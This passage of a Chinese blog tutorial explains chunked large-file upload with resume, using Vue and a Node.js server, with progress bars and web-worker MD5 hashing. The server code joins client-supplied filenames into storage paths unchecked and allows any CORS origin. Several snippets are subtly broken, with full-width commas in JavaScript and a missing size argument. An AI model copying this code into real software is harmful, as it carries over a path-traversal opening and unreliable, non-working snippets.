class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&quot;http&quot;);</span><br><span class="line">  const path = require(&quot;path&quot;);</span><br><span class="line">  const fse = require(&quot;fs-extra&quot;);</span><br><span class="line">  const multiparty = require(&quot;multiparty&quot;);</span><br><span class="line">  const server = http.createServer();</span><br><span class="line">  + const UPLOAD_DIR = path.resolve(__dirname, &quot;..&quot;, &quot;target&quot;); // 大文件存储目录</span><br><span class="line">  server.on(&quot;request&quot;, async (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;*&quot;);</span><br><span class="line">  if (req.method === &quot;OPTIONS&quot;) &#123;</span><br><span class="line">  res.status = 200;</span><br><span class="line">  res.end();</span><br><span class="line">  return;</span><br><span class="line">  &#125;</span><br><span class="line">  +  const multipart = new multiparty.Form();</span><br><span class="line">  +  multipart.parse(req, async (err, fields, files) =&gt; &#123;</span><br><span class="line">  +    if (err) &#123;</span><br><span class="line">  +      return;</span><br><span class="line">  +    &#125;</span><br><span class="line">  +    const [chunk] = files.chunk;</span><br><span class="line">  +    const [hash] = fields.hash;</span><br><span class="line">  +    const [filename] = fields.filename;</span><br><span class="line">  +    const chunkDir = path.resolve(UPLOAD_DIR, filename);</span><br><span class="line">  +   // 切片目录不存在，创建切片目录</span><br><span class="line">  +    if (!fse.existsSync(chunkDir)) &#123;</span><br><span class="line">  +      await fse.mkdirs(chunkDir);</span><br><span class="line">  +    &#125;</span><br><span class="line">  +      // fs-extra 专用方法，类似 fs.rename 并且跨平台</span><br><span class="line">  +      // fs-extra 的 rename 方法 windows 平台会有权限问题</span><br><span class="line">  +      // https://github.com/meteor/meteor/issues/7852#issuecomment-255767835</span><br><span class="line">  +      await fse.move(chunk.path, `$&#123;chunkDir&#125;/$&#123;hash&#125;`);</span><br><span class="line">  +    res.end(&quot;received file chunk&quot;);</span><br><span class="line">  +  &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  server.listen(3000, () =&gt; console.log(&quot;正在监听 3000 端口&quot;));</span><br><span class="line">  复制代码</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300724-04872720-0840-4492-b665-47ac9f945492.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300724-04872720-0840-4492-b665-47ac9f945492.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="grG7L"></a></p><h3 id="合并切片"><a href="#合并切片" class="headerlink" title="合并切片"></a>合并切片</h3><p>在接收到前端发送的合并请求后，服务端将文件夹下的所有切片进行合并</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&quot;http&quot;);</span><br><span class="line">  const path = require(&quot;path&quot;);</span><br><span class="line">  const fse = require(&quot;fs-extra&quot;);</span><br><span class="line">  const server = http.createServer();</span><br><span class="line">  const UPLOAD_DIR = path.resolve(__dirname, &quot;..&quot;, &quot;target&quot;); // 大文件存储目录</span><br><span class="line">   const resolvePost = req =&gt;</span><br><span class="line">     new Promise(resolve =&gt; &#123;</span><br><span class="line">       let chunk = &quot;&quot;;</span><br><span class="line">       req.on(&quot;data&quot;, data =&gt; &#123;</span><br><span class="line">         chunk += data;</span><br><span class="line">       &#125;);</span><br><span class="line">       req.on(&quot;end&quot;, () =&gt; &#123;</span><br><span class="line">         resolve(JSON.parse(chunk));</span><br><span class="line">       &#125;);</span><br><span class="line">     &#125;);</span><br><span class="line">   const pipeStream = (path, writeStream) =&gt;</span><br><span class="line">    new Promise(resolve =&gt; &#123;</span><br><span class="line">      const readStream = fse.createReadStream(path);</span><br><span class="line">      readStream.on(&quot;end&quot;, () =&gt; &#123;</span><br><span class="line">        fse.unlinkSync(path);</span><br><span class="line">        resolve();</span><br><span class="line">      &#125;);</span><br><span class="line">      readStream.pipe(writeStream);</span><br><span class="line">    &#125;);</span><br><span class="line">  // 合并切片</span><br><span class="line">   const mergeFileChunk = async (filePath, filename, size) =&gt; &#123;</span><br><span class="line">    const chunkDir = path.resolve(UPLOAD_DIR, filename);</span><br><span class="line">    const chunkPaths = await fse.readdir(chunkDir);</span><br><span class="line">    // 根据切片下标进行排序</span><br><span class="line">    // 否则直接读取目录的获得的顺序可能会错乱</span><br><span class="line">    chunkPaths.sort((a, b) =&gt; a.split(&quot;-&quot;)[1] - b.split(&quot;-&quot;)[1]);</span><br><span class="line">    await Promise.all(</span><br><span class="line">      chunkPaths.map((chunkPath, index) =&gt;</span><br><span class="line">        pipeStream(</span><br><span class="line">          path.resolve(chunkDir, chunkPath),</span><br><span class="line">          // 指定位置创建可写流</span><br><span class="line">          fse.createWriteStream(filePath, &#123;</span><br><span class="line">            start: index * size,</span><br><span class="line">            end: (index + 1) * size</span><br><span class="line">          &#125;)</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">    fse.rmdirSync(chunkDir); // 合并后删除保存切片的目录</span><br><span class="line">  &#125;;</span><br><span class="line">  server.on(&quot;request&quot;, async (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;*&quot;);</span><br><span class="line">  if (req.method === &quot;OPTIONS&quot;) &#123;</span><br><span class="line">  res.status = 200;</span><br><span class="line">  res.end();</span><br><span class="line">  return;</span><br><span class="line">  &#125;</span><br><span class="line">     if (req.url === &quot;/merge&quot;) &#123;</span><br><span class="line">       const data = await resolvePost(req);</span><br><span class="line">       const &#123; filename,size &#125; = data;</span><br><span class="line">       const filePath = path.resolve(UPLOAD_DIR, `$&#123;filename&#125;`);</span><br><span class="line">       await mergeFileChunk(filePath, filename);</span><br><span class="line">       res.end(</span><br><span class="line">         JSON.stringify(&#123;</span><br><span class="line">           code: 0,</span><br><span class="line">           message: &quot;file merged success&quot;</span><br><span class="line">         &#125;)</span><br><span class="line">       );</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  server.listen(3000, () =&gt; console.log(&quot;正在监听 3000 端口&quot;));</span><br></pre></td></tr></table></figure><p>由于前端在发送合并请求时会携带文件名，服务端根据文件名可以找到上一步创建的切片文件夹<br />接着使用 fs.createWriteStream 创建一个可写流，可写流文件名就是<strong>切片文件夹名 + 后缀名</strong>组合而成<br />随后遍历整个切片文件夹，将切片通过 fs.createReadStream 创建可读流，传输合并到目标文件中<br />值得注意的是每次可读流都会传输到可写流的指定位置，这是通过 createWriteStream 的第二个参数 start&#x2F;end 控制的，目的是能够并发合并多个可读流到可写流中，这样即使流的顺序不同也能传输到正确的位置，所以这里还需要让前端在请求的时候多提供一个 size 参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">mergeRequest</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000/merge&quot;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">      +         <span class="attr">size</span>: <span class="variable constant_">SIZE</span>,</span><br><span class="line">      <span class="attr">filename</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300704-6beb554c-7db6-4401-96d9-7c92bf363f67.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300704-6beb554c-7db6-4401-96d9-7c92bf363f67.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />至此一个简单的大文件上传就完成了，接下来我们再此基础上扩展一些额外的功能<br><a name="Pjd1l"></a></p><h2 id="显示上传进度条"><a href="#显示上传进度条" class="headerlink" title="显示上传进度条"></a>显示上传进度条</h2><p>上传进度分两种，一个是每个切片的上传进度，另一个是整个文件的上传进度，而整个文件的上传进度是基于每个切片上传进度计算而来，所以我们先实现切片的上传进度<br><a name="rIKCx"></a></p><h3 id="切片进度条"><a href="#切片进度条" class="headerlink" title="切片进度条"></a>切片进度条</h3><p>XMLHttpRequest 原生支持上传进度的监听，只需要监听 upload.onprogress 即可，我们在原来的 request 基础上传入 onProgress 参数，给 XMLHttpRequest 注册监听事件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xhr</span></span><br><span class="line"><span class="title function_">request</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">  url,</span></span><br><span class="line"><span class="params">  method = <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="params">  data,</span></span><br><span class="line"><span class="params">  headers = &#123;&#125;,</span></span><br><span class="line"><span class="params">  +      onProgress = e =&gt; e,</span></span><br><span class="line"><span class="params">  requestList</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    +       xhr.<span class="property">upload</span>.<span class="property">onprogress</span> = onProgress;</span><br><span class="line">    xhr.<span class="title function_">open</span>(method, url);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(headers).<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span></span><br><span class="line">      xhr.<span class="title function_">setRequestHeader</span>(key, headers[key])</span><br><span class="line">                                );</span><br><span class="line">    xhr.<span class="title function_">send</span>(data);</span><br><span class="line">    xhr.<span class="property">onload</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(&#123;</span><br><span class="line">        <span class="attr">data</span>: e.<span class="property">target</span>.<span class="property">response</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于每个切片都需要触发独立的监听事件，所以还需要一个工厂函数，根据传入的切片返回不同的监听函数<br />在原先的前端上传逻辑中新增监听函数部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 上传切片，同时过滤已上传的切片</span></span><br><span class="line"><span class="keyword">async</span> <span class="title function_">uploadChunks</span>(<span class="params">uploadedList = []</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> requestList = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; chunk,hash,index &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;chunk&quot;</span>, chunk);</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;hash&quot;</span>, hash);</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>);</span><br><span class="line">              <span class="keyword">return</span> &#123; formData,index &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">        .<span class="title function_">map</span>(<span class="keyword">async</span> (&#123; formData,index &#125;) =&gt;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: formData，</span><br><span class="line">                  <span class="attr">onProgress</span>: <span class="variable language_">this</span>.<span class="title function_">createProgressHandler</span>(<span class="variable language_">this</span>.<span class="property">data</span>[index]),</span><br><span class="line">      &#125;)</span><br><span class="line">                );</span><br><span class="line">  <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(requestList);</span><br><span class="line">  <span class="comment">// 合并切片</span></span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">mergeRequest</span>();</span><br><span class="line">&#125;,</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;，index</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">chunk</span>: file,</span><br><span class="line">        index,</span><br><span class="line">    <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span> + <span class="string">&quot;-&quot;</span> + index</span><br><span class="line">           <span class="attr">percentage</span>:<span class="number">0</span></span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">createProgressHandler</span>(<span class="params">item</span>) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">           item.<span class="property">percentage</span> = <span class="built_in">parseInt</span>(<span class="title class_">String</span>((e.<span class="property">loaded</span> / e.<span class="property">total</span>) * <span class="number">100</span>));</span><br><span class="line">       &#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>每个切片在上传时都会通过监听函数更新 data 数组对应元素的 percentage 属性，之后把将 data 数组放到视图中展示即可<br><a name="yNvn5"></a></p><h3 id="文件进度条"><a href="#文件进度条" class="headerlink" title="文件进度条"></a>文件进度条</h3><p>将每个切片已上传的部分累加，除以整个文件的大小，就能得出当前文件的上传进度，所以这里使用 Vue 计算属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">  <span class="title function_">uploadPercentage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span> || !<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">length</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> loaded = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">      .<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">size</span> * item.<span class="property">percentage</span>)</span><br><span class="line">      .<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc + cur);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((loaded / <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">size</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>最终视图如下<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300712-d2e412fa-ed42-4452-98fb-c5a728d44a55.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300712-d2e412fa-ed42-4452-98fb-c5a728d44a55.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="rI21c"></a></p><h1 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h1><p>断点续传的原理在于前端&#x2F;服务端需要<code>记住</code>已上传的切片，这样下次上传就可以跳过之前已上传的部分，有两种方案实现记忆的功能</p><ul><li>前端使用 localStorage 记录已上传的切片 hash</li><li>服务端保存已上传的切片 hash，前端每次上传前向服务端获取已上传的切片</li></ul><p>第一种是前端的解决方案，第二种是服务端，而前端方案有一个缺陷，如果换了个浏览器就失去了记忆的效果，所以这里选取后者<br><a name="GWcjL"></a></p><h2 id="生成-hash"><a href="#生成-hash" class="headerlink" title="生成 hash"></a>生成 hash</h2><p>无论是前端还是服务端，都必须要生成文件和切片的 hash，<code>之前我们使用文件名 + 切片下标作为切片 hash</code>，这样做文件名一旦修改就失去了效果，而事实上只要文件内容不变，hash 就不应该变化，所以正确的做法是<code>根据文件内容生成 hash</code>，所以我们修改一下 hash 的生成规则<br />这里用到另一个库 <code>spark-md5</code>，它可以根据文件内容计算出文件的 hash 值，另外考虑到如果上传一个超大文件，读取文件内容计算 hash 是非常耗费时间的，并且会<code>引起 UI 的阻塞</code>，导致页面假死状态，所以我们使用 web-worker 在 worker 线程计算 hash，这样用户仍可以在主界面正常的交互<br />由于实例化 web-worker 时，参数是一个 js 文件路径且不能跨域，所以我们单独创建一个 hash.js 文件放在 public 目录下，另外在 worker 中也是不允许访问 dom 的，但它提供了<code>importScripts</code> 函数用于导入外部脚本，通过它导入 spark-md5</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /public/hash.js</span></span><br><span class="line">self.importScripts(<span class="string">&quot;/spark-md5.min.js&quot;</span>); <span class="comment">// 导入脚本</span></span><br><span class="line"><span class="comment">// 生成文件 hash</span></span><br><span class="line">self.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; fileChunkList &#125; = e.<span class="property">data</span>;</span><br><span class="line">  <span class="keyword">const</span> spark = <span class="keyword">new</span> self.<span class="property">SparkMD5</span>.<span class="title class_">ArrayBuffer</span>();</span><br><span class="line">  <span class="keyword">let</span> percentage = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">loadNext</span> = index =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">    reader.<span class="title function_">readAsArrayBuffer</span>(fileChunkList[index].<span class="property">file</span>);</span><br><span class="line">    reader.<span class="property">onload</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      count++;</span><br><span class="line">      spark.<span class="title function_">append</span>(e.<span class="property">target</span>.<span class="property">result</span>);</span><br><span class="line">      <span class="keyword">if</span> (count === fileChunkList.<span class="property">length</span>) &#123;</span><br><span class="line">        self.<span class="title function_">postMessage</span>(&#123;</span><br><span class="line">          <span class="attr">percentage</span>: <span class="number">100</span>,</span><br><span class="line">          <span class="attr">hash</span>: spark.<span class="title function_">end</span>()</span><br><span class="line">        &#125;);</span><br><span class="line">        self.<span class="title function_">close</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        percentage += <span class="number">100</span> / fileChunkList.<span class="property">length</span>;</span><br><span class="line">        self.<span class="title function_">postMessage</span>(&#123;</span><br><span class="line">          percentage</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 递归计算下一个切片</span></span><br><span class="line">        <span class="title function_">loadNext</span>(count);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">loadNext</span>(<span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>在 worker 线程中，接受文件切片 fileChunkList，利用 FileReader 读取每个切片的 ArrayBuffer 并不断传入 spark-md5 中，每计算完一个切片通过 postMessage 向主线程发送一个进度事件，全部完成后将最终的 hash 发送给主线程<br /><code>spark-md5 需要根据所有切片才能算出一个 hash 值，不能直接将整个文件放入计算，否则即使不同文件也会有相同的 hash，具体可以看官方文档</code><br /><a href="https://www.npmjs.com/package/spark-md5">spark-md5</a><br />接着编写主线程与 worker 线程通讯的逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="comment">// 生成文件 hash（web-worker）</span></span><br><span class="line">  +    <span class="title function_">calculateHash</span>(<span class="params">fileChunkList</span>) &#123;</span><br><span class="line">    +      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">      +       <span class="comment">// 添加 worker 属性</span></span><br><span class="line">        +        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">worker</span> = <span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&quot;/hash.js&quot;</span>);</span><br><span class="line">      +        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">worker</span>.<span class="title function_">postMessage</span>(&#123; fileChunkList &#125;);</span><br><span class="line">      +        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">worker</span>.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        +          <span class="keyword">const</span> &#123; percentage, hash &#125; = e.<span class="property">data</span>;</span><br><span class="line">        +          <span class="variable language_">this</span>.<span class="property">hashPercentage</span> = percentage;</span><br><span class="line">        +          <span class="keyword">if</span> (hash) &#123;</span><br><span class="line">          +            <span class="title function_">resolve</span>(hash);</span><br><span class="line">        +          &#125;</span><br><span class="line">          +        &#125;;</span><br><span class="line">      +      &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">  +     <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;，index</span>) =&gt;</span> (&#123;</span><br><span class="line">    +       <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">    <span class="attr">chunk</span>: file,</span><br><span class="line">    <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span> + <span class="string">&quot;-&quot;</span> + index, <span class="comment">// 文件名 + 数组下标</span></span><br><span class="line">    <span class="attr">percentage</span>:<span class="number">0</span></span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>();</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>主线程使用 <code>postMessage</code> 给 worker 